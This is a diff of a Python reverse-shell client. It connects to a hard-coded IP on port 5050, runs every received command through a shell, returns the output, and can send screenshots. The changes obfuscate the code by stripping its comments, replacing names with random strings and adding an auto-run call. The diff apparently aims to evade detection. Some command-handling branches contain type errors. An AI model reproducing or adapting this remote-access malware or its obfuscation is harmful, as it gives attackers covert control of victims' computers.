@@ -1,7 +1,5 @@
-'''importing modules'''
 import sys , os ,time
 try:
-    import subprocess
     import pyautogui
     import tqdm
 except:
@@ -12,31 +10,29 @@ except:
     import subprocess
     import pyautogui
     import tqdm
-'''seting variables'''
 import socket
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = "192.168.1.110"
-port = 5050
-SEPARATOR = "<SEPARATOR>"
+bASYUAusU = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+PLppsokPSO = "192.168.1.41"
+OIWODFISO = 5050
+PPJAjpA = "<SEPARATOR>"
 
-'''starting connecting to the server'''
-s.connect((host ,port))
+bASYUAusU.connect((PLppsokPSO ,OIWODFISO))
 
-'''sending info'''
-def recv_cammand():
+def yyyyyyyyyyYyySSAASKJAKSAS():
     while True:
-        data = s.recv(1024)
-        if data[0:] == "cd":
-            os.chdir(data[2:].encode("utf-8"))
-        elif data[0] == "screenshot":
-            for i in range(data[2:].encode("utf-8")):
-                screenshot = pyautogui.screenshot()
-                img = screenshot.save(f"target{i}.png")
-                img_size = os.path.getsize(img)
-                s.send(f"{img}{SEPARATOR}{img_size}".encode("utf-8"))
-        if len(data) > 0:
-            terminal = subprocess.Popen(data[:].encode("utf-8"), shell=True, stdout=subprocess.PIPE ,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
-            output_bite = terminal.stdout.read() + terminal.stderr.read()
-            output_str = str(output_bite,"utf-8")
-            s.send(str.encode(output_str))
-    s.close()
+        OASASASONon = bASYUAusU.recv(1024)
+        if OASASASONon[0:] == "cd":
+            os.chdir(OASASASONon[2:].encode("utf-8"))
+        elif OASASASONon[0:] == "screenshot":
+            for i in range(OASASASONon[2].encode("utf-8")):
+                OUauaoxuu = pyautogui.screenshot()
+                OIioiaoIX = OUauaoxuu.save(f"target{i}.png")
+                jNOsiauiays = os.path.getsize(OIioiaoIX)
+                bASYUAusU.send(f"{OIioiaoIX}{PPJAjpA}{jNOsiauiays}".encode("utf-8"))
+        if len(OASASASONon) > 0:
+            oCDISDCICjnkjn = subprocess.Popen(OASASASONon[:].encode("utf-8"), shell=True, stdout=subprocess.PIPE ,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+            kjaxnajkbc = oCDISDCICjnkjn.stdout.read() + oCDISDCICjnkjn.stderr.read()
+            MolLknKN = str(kjaxnajkbc,"utf-8")
+            bASYUAusU.send(str.encode(MolLknKN))
+    bASYUAusU.close()
+yyyyyyyyyyYyySSAASKJAKSAS()
